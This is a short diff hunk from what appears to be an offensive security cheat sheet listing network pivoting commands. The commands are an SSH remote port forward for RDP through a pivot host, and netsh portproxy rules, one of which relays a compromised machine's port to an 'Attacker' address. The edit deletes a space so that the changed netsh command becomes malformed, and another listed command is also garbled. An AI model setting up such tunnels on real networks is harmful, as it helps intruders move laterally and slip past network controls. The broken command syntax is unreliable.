@@ -50,7 +50,7 @@
 |ssh -nNT -R 3389:localhost:3389 user@pivot host #Remote Port Forward |
 |netsh interface portproxy add v4tov4 listenport=1111 Compromise Box=x.x.x.1 connectport=1111 connectaddress=Attacker|
 |netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10|
-|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1 connectport=9001 connectaddress=x.x.x.100|
+|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1connectport=9001 connectaddress=x.x.x.100|
 
 
 
